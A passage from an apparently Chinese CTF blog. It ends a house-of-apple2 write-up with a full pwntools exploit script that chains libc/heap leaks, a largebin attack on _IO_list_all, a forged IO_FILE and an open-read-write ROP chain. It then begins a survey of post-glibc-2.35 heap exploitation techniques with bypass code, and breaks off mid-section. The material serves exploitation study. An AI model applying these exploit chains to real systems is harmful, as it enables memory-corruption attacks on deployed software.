<span class="hljs-number">0x200</span>) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">0x30</span>) * <span class="hljs-number">2</span> + p64(readd)<br>orw += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(orw_addr + <span class="hljs-number">0x200</span>) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">0x30</span>) * <span class="hljs-number">2</span> + p64(writee)<br>orw = orw.ljust(<span class="hljs-number">0x128</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(leave_ret)<br><br><br></code></pre></td></tr></table></figure><p>在0x18处存储orw+0x100，orw填充0x128个，后边跟<code>leave_ret</code></p><h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwnpy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>filename = <span class="hljs-string">&#x27;./test&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  b * 0x7ffff7d6a06a</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>set_context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, timeout=<span class="hljs-number">5</span>)<br>p = pr(url = url , filename = filename , gdbscript = gdbscript)<br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;/usr/lib/freelibs/amd64/2.35-0ubuntu3.8_amd64/libc.so.6&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.add                                                                                                        </span><br><span class="hljs-string">2.edit</span><br><span class="hljs-string">3.show</span><br><span class="hljs-string">4.delete</span><br><span class="hljs-string">5.exit</span><br><span class="hljs-string">Your choice:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx , size</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;index:\n&quot;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&quot;Size:\n&quot;</span> , <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;index:\n&quot;</span> , <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;index:\n&quot;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&quot;size:\n&quot;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&quot;context: &quot;</span> , content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;index:\n&quot;</span> , <span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x440</span>)<br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x430</span>)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0x10</span>)<br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x460</span>)<br><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:] + <span class="hljs-string">b&#x27;\0\0&#x27;</span>) - <span class="hljs-number">0x21b0e0</span><br>edit(<span class="hljs-number">0</span> , <span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br><br>IO_list_all=libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x21ca60</span><br>edit(<span class="hljs-number">0</span> , <span class="hljs-number">0x40</span> , p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(IO_list_all - <span class="hljs-number">0x20</span>))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x470</span>)<br><br>leave_ret = libc_base + <span class="hljs-number">0x000000000004da83</span><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_rbx = libc_base + <span class="hljs-number">0x00000000000904a9</span><br>openn = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>readd = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>writee = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>orw_addr = heap_base + <span class="hljs-number">0xfe0</span><br>orw = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>orw += p64(pop_rdx_rbx) + p64(<span class="hljs-number">0</span>) + p64(orw_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdi) + p64(orw_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(openn)<br>orw += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(orw_addr + <span class="hljs-number">0x200</span>) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">0x30</span>) * <span class="hljs-number">2</span> + p64(readd)<br>orw += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(orw_addr + <span class="hljs-number">0x200</span>) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">0x30</span>) * <span class="hljs-number">2</span> + p64(writee)<br>orw = orw.ljust(<span class="hljs-number">0x128</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(leave_ret)<br><br>edit(<span class="hljs-number">4</span> , <span class="hljs-built_in">len</span>(orw) , orw)<br><br>io_addr = heap_base + <span class="hljs-number">0x700</span><br>IO_wide_data_addr = io_addr<br>wide_vtable_addr = io_addr + <span class="hljs-number">0xe8</span> - <span class="hljs-number">0x68</span><br>magic = libc_base + <span class="hljs-number">0x16a06a</span><br>fake_io = <span class="hljs-string">b&quot;&quot;</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_read_end</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_read_base</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base</span><br>fake_io += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_end</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base;</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span><br>fake_io += p64(orw_addr)   <span class="hljs-comment"># _IO_save_base </span><br>fake_io += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>   <span class="hljs-comment"># from _IO_backup_base to _markers</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># the FILE chain ptr</span><br>fake_io += p32(<span class="hljs-number">2</span>)  <span class="hljs-comment"># _fileno for stderr is 2</span><br>fake_io += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _flags2, usually 0</span><br>fake_io += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)  <span class="hljs-comment"># _old_offset, -1</span><br>fake_io += p16(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _cur_column</span><br>fake_io += <span class="hljs-string">b&quot;\x00&quot;</span>  <span class="hljs-comment"># _vtable_offset</span><br>fake_io += <span class="hljs-string">b&quot;\n&quot;</span>  <span class="hljs-comment"># _shortbuf[1]</span><br>fake_io += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># padding</span><br>fake_io += p64(_IO_stdfile_2_lock)  <span class="hljs-comment"># _IO_stdfile_2_lock</span><br>fake_io += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)  <span class="hljs-comment"># _offset, -1</span><br>fake_io += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _codecvt, usually 0</span><br>fake_io += p64(IO_wide_data_addr)  <span class="hljs-comment"># _IO_wide_data_2</span><br>fake_io += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>  <span class="hljs-comment"># from _freeres_list to __pad5</span><br>fake_io += p32(<span class="hljs-number">0xFFFFFFFF</span>)  <span class="hljs-comment"># _mode, usually -1</span><br>fake_io += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">19</span>  <span class="hljs-comment"># _unused2</span><br>fake_io = fake_io.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment"># adjust to vtable</span><br>fake_io += p64(libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>])  <span class="hljs-comment"># _IO_list_all fake vtable</span><br>fake_io += p64(wide_vtable_addr)<br>fake_io += p64(magic)<br><br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(fake_io) , fake_io)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:\n&quot;</span> , <span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>lss(<span class="hljs-string">&quot;magic&quot;</span>)<br>lss(<span class="hljs-string">&quot;_IO_stdfile_2_lock&quot;</span>)<br>lss(<span class="hljs-string">&quot;heap_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>house-of-apple2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libc各版本堆利用方法</title>
    <link href="/2025/03/13/libc%E5%90%84%E7%89%88%E6%9C%AC%E5%A0%86%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2025/03/13/libc%E5%90%84%E7%89%88%E6%9C%AC%E5%A0%86%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="各版本libc利用方法"><a href="#各版本libc利用方法" class="headerlink" title="各版本libc利用方法"></a>各版本libc利用方法</h1><p>进入到<code>glibc-2.31</code>之后，很多原有的堆利用方法就失效，因此<code>glibc</code>给堆分配机制陆陆续续打上了很多<code>patch</code>，目前来看，与堆利用有关的<code>patch</code>有：</p><ul><li><code>tcachebin</code>堆指针异或加密（<code>glibc-2.32</code>引入）</li><li><code>tcahebin</code>链的数量检查（<code>glibc-2.33</code>引入）</li><li><code>fastbin</code>堆指针异或加密（<code>glibc-2.32</code>引入）</li><li>堆内存对齐检查（<code>glibc-2.32</code>引入）</li><li>移除<code>__malloc_hook</code>和<code>__free_hook</code>（<code>glibc-2.34</code>引入）</li><li>引入<code>tcache_key</code>作为<code>tcache</code>的<code>key</code>检查（<code>glibc-2.34</code>引入）</li><li><code>__malloc_assert</code>移除掉<code>IO</code>处理函数（<code>glibc-2.36</code>引入）</li><li>移除<code>__malloc_assert</code>函数（<code>glibc-2.37</code>引入）</li><li>将<code>global_max_fast</code>的数据类型修改为<code>uint8_t</code>（<code>glibc-2.37</code>引入）</li></ul><p>根据目前已有的<code>patch</code>，结合之前已有的堆利用方法，总结<code>2.35</code>版本之后的攻击向量与攻击面，给出针对这些攻击面的攻击手段，并对某些攻击面的利用方法进行思考和拓展。如有错误或遗漏，欢迎批评指正。</p><h1 id="1-攻击向量"><a href="#1-攻击向量" class="headerlink" title="1-攻击向量"></a>1-攻击向量</h1><h2 id="1-1-tcachebin"><a href="#1-1-tcachebin" class="headerlink" title="1-1 tcachebin"></a>1-1 tcachebin</h2><p>事实上，在泄露地址的基础上劫持<code>tcachebin</code>的<code>next</code>，依然可以任意地址分配。</p><h3 id="1-1-1-绕过指针保护"><a href="#1-1-1-绕过指针保护" class="headerlink" title="1-1-1 绕过指针保护"></a>1-1-1 绕过指针保护</h3><p>绕过指针异或的保护方法主要有两种：</p><ul><li><p>当<code>tcachebin</code>链表中只有一个<code>chunk</code>的时候，此时<code>chunk-&gt;next &lt;&lt; 12</code>即可得到堆地址。</p></li><li><p>当<code>tcachebin</code>链表的前两个<code>chunk</code>的地址相差不是很大的时候，可以用下面的公式计算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_heap</span>(<span class="hljs-params">addr</span>):<br><br>    s = <span class="hljs-built_in">hex</span>(addr)[<span class="hljs-number">2</span>:]<br><br>    s = [<span class="hljs-built_in">int</span>(x, base=<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> s]<br><br>    res = s.copy()<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br><br>        res[<span class="hljs-number">3</span>+i] ^= res[i]<br><br>    res = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> res])<br><br>    <span class="hljs-keyword">return</span> int16_ex(res)<br><br><br></code></pre></td></tr></table></figure><p>这里的<code>addr</code>就是头部<code>chunk</code>的加密后的<code>next</code>，只泄露一次就能还原出来。</p></li></ul><h3 id="1-1-2-劫持tcache-ptheread-struct"><a href="#1-1-2-劫持tcache-ptheread-struct" class="headerlink" title="1-1-2 劫持tcache_ptheread_struct"></a>1-1-2 劫持tcache_ptheread_struct</h3><p>这个结构体的重要性不言而喻，劫持了这个结构体可以控制<code>tcachebin</code>的分配。一般可以用<code>tcachebin stash unlink</code>或者<code>largebin attack</code>劫持。</p><h3 id="1-1-3-修改线程tcache变量"><a href="#1-1-3-修改线程tcache变量" class="headerlink" title="1-1-3 修改线程tcache变量"></a>1-1-3 修改线程tcache变量</h3><p>在<code>tls</code>区域，有一个线程变量<code>tcache</code>，如果能用<code>largebin attack</code>修改<code>tcache</code>变量，也可以控制<code>tcache</code>的分配。</p><h3 id="1-1-4-修改mp-结构体"><a href="#1-1-4-修改mp-结构体" class="headerlink" title="1-1-4 修改mp_结构体"></a>1-1-4 修改mp_结构体</h3><p>关注与<code>tcache</code>有关的几个变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span></span><br><span class="hljs-class"></span><br><span class="hljs-class">&#123;</span><br><br><span class="hljs-comment">//......</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span><br><br>  <span class="hljs-type">size_t</span> tcache_bins;<br><br>  <span class="hljs-type">size_t</span> tcache_max_bytes;<br><br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span><br><br>  <span class="hljs-type">size_t</span> tcache_count;<br><br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span><br><br>  <span class="hljs-type">size_t</span> tcache_unsorted_limit;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br><br><br></code></pre></td></tr></table></figure><p>修改掉<code>tcache_bins</code>可以把很大的<code>chunk</code>用<code>tcachebin</code>管理；修改掉<code>tcache_count</code>可以控制链表的<code>chunk</code>的数量。<code>tcache_max_bytes</code>目前没啥用，<code>tcache_unsorted_limit</code>可以影响<code>unsortedbin</code>链表的遍历过程。</p><h2 id="1-2-fastbin"><a href="#1-2-fastbin" class="headerlink" title="1-2 fastbin"></a>1-2 fastbin</h2><h3 id="1-2-1-house-of-corrosion"><a href="#1-2-1-house-of-corrosion" class="headerlink" title="1-2-1 house of corrosion"></a>1-2-1 house of corrosion</h3><p>使用的范围只能在<code>2.35~2.37</code>，进入到<code>2.37</code>之后，<code>global_max_fast</code>的类型被修改为<code>int8_t</code>，使用该技巧可以控制的地址范围大大缩小。</p><p>有关<code>house of corrosion</code>的技巧可以参考<a href="https://xz.aliyun.com/t/6862#toc-5">House-of-Corrosion 一种新的堆利用技巧 - 先知社区 (aliyun.com)</a>。</p><h3 id="1-2-2-tcache-reverse-into-fastbin"><a href="#1-2-2-tcache-reverse-into-fastbin" class="headerlink" title="1-2-2 tcache reverse into fastbin"></a>1-2-2 tcache reverse into fastbin</h3><p>目前检查了对齐，所以要注意控制的地址要是<code>0x?0</code>结尾，否则报错。利用效果是任意地址写一个<code>libc</code>地址。</p><p>虽然<code>0x?0</code>写的是加密后的堆地址，但是<code>0x?8</code>会写上<code>tcache_key</code>，这也是可以利用的点。而且，在写上地址后，还能分配到该处。其利用过程如下：</p><ul><li>分配<code>13</code>个<code>fastbin</code>范围内的<code>chunk</code>，假设大小为<code>A</code></li><li>全部释放这<code>13</code>个<code>chunk</code></li><li>分配<code>7</code>个，把<code>tcachebin[A]</code>耗尽</li><li>把<code>fastbin</code>最后一个<code>chunk</code>的<code>fd</code>修改为<code>addr</code></li><li>调用一次<code>malloc(A)</code>即可触发<code>tcache reverse into fastbin</code>，可以分配到<code>addr</code>，也能给<code>addr/addr+8</code>处写上地址&#x2F;数</li></ul><h2 id="1-3-smallbin"><a href="#1-3-smallbin" class="headerlink" title="1-3 smallbin"></a>1-3 smallbin</h2><h3 id="1-3-1-house-of-lore"><a href="#1-3-1-house-of-lore" class="headerlink" title="1-3-1 house of lore"></a>1-3-1 house of lore</h3><p>很显然，<code>house of lore</code>依然可以使用，但是<code>house of lore</code>使用的时候，一方面是需要满足<code>victim-&gt;fd-&gt;bk == victim</code>；另一方面，需要绕过下面讲的<code>tcache stash unlink</code>流程。除此之外，还需要注意内存对齐的问题。</p><h3 id="1-3-2-tcache-stash-unlink-attack"><a href="#1-3-2-tcache-stash-unlink-attack" class="headerlink" title="1-3-2 tcache stash unlink attack"></a>1-3-2 tcache stash unlink attack</h3><p>在我之前的博客中，分析<code>house of rust</code>的时候总结过这个利用手法。</p><p>第一个技巧叫 <code>tcachebin stash unlinking</code>，下面称之为 <code>TSU</code> 技巧：</p><ul><li><code>tcachebin[A]</code> 为空</li><li><code>smallbin[A]</code> 有 <code>8</code> 个</li><li>修改第 <code>8</code> 个 <code>smallbin chunk</code> 的 <code>bk</code> 为 <code>addr</code></li><li>分配 <code>malloc(A)</code> 的时候，<code>addr+0x10</code> 会被写一个 <code>libc</code> 地址</li></ul><p>第二个技巧叫 <code>tcachebin stash unlinking+</code>，下面称之为 <code>TSU+</code> 技巧：</p><ul><li><code>tcachebin[A]</code> 为空</li><li><code>smallbin[A]</code> 有 <code>8</code> 个</li><li>修改第 <code>7</code> 个 <code>smallbin chunk</code> 的 <code>bk</code> 为 <code>addr</code>，还要保证 <code>addr+0x18</code> 是一个合法可写的地址</li><li>分配 <code>malloc(A)</code> 的时候，<code>addr</code> 会被链入到 <code>tcachebin</code>，也就是可以分配到 <code>addr</code> 处</li></ul><p>可以看到，和<code>fastbin reverse into tcache</code>的攻击方法很类似，但是得到的效果不一样。<code>TSU</code>可以在任意地址写<code>libc</code>地址，而<code>TSU+</code>除了可以写<code>libc</code>地址，还能再任意地址分配。</p><h2 id="1-4-largebin"><a href="#1-4-largebin" class="headerlink" title="1-4 largebin"></a>1-4 largebin</h2><p>目前能用的<code>largebin attack</code>只能使用下面这个分支：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* maintain large bins in sorted order */</span><br><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br><br>                &#123;<br><br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br><br>                  size |= PREV_INUSE;<br><br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br><br>                  assert (chunk_main_arena (bck-&gt;bk));<br><br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size)<br><br>      &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br><br>                    &#123;<br><br>                      fwd = bck;<br><br>                      bck = bck-&gt;bk;<br><br><br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br><br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br><br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><br>                    &#125;<br><br>                  <span class="hljs-keyword">else</span><br><br>                    &#123;<br><br>                      <span class="hljs-comment">//......</span><br><br>                  &#125;<br><br>                  <span class="hljs-comment">//......</span><br><br>              &#125;<br><br><br></code></pre></td></tr></table></figure><p>效果是可以任意地址写堆地址。</p><p><code>largebin attack</code>往往会与其他攻击方法结合起来，因为其写地址的能力，可以修改变量，所以常常用来构造写原语。</p><h3 id="1-4-1-house-of-husk"><a href="#1-4-1-house-of-husk" class="headerlink" title="1-4-1 house of husk"></a>1-4-1 house of husk</h3><p><code>house of husk</code>方法仍然可以利用，需要找到一个格式化字符串的场景，且打<code>house of husk</code>的时候，至少需要两次格式化字符串。</p><h3 id="1-4-2-libc-ld上的变量"><a href="#1-4-2-libc-ld上的变量" class="headerlink" title="1-4-2 libc&#x2F;ld上的变量"></a>1-4-2 libc&#x2F;ld上的变量</h3><p><code>libc/ld</code>的地址空间上关键变量非常多，比如<code>_IO_list_all</code>，<code>pointer_guard</code>、<code>tcache</code>等等。具体的方法会在相关的篇幅里面进行详细说明和补充。</p><h2 id="1-5-IO-FILE"><a href="#1-5-IO-FILE" class="headerlink" title="1-5 IO_FILE"></a>1-5 IO_FILE</h2><h3 id="1-5-1-house-of-kiwi"><a href="#1-5-1-house-of-kiwi" class="headerlink" title="1-5-1 house of kiwi"></a>1-5-1 house of kiwi</h3><p>在这个<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=ac8047cdf326504f652f7db97ec96c0e0cee052f">commit</a>里面将<code>__malloc_assert</code>的实现逻辑修改了。</p><p><a href="https://image.roderickchan.cn/img/image-20230310102503481.png"><img src="https://image.roderickchan.cn/img/image-20230310102503481.png" alt="image-20230310102503481"></a></p><p>也就是说，在<code>glibc-2.36</code>及其之后，<code>house of kiwi</code>的利用链失效了。</p><p>而在这个<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=9001cb1102cddba54f0e84e147dfbb0356067356">commit</a>，直接使用默认的<code>assert</code>，<code>__malloc_assert</code>被删掉了：</p><p><a href="https://image.roderickchan.cn/img/image-20230310102759826.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20230310102759826.png" alt="image-20230310102759826"></a></p><h3 id="1-5-2-house-of-emma"><a href="#1-5-2-house-of-emma" class="headerlink" title="1-5-2 house of emma"></a>1-5-2 house of 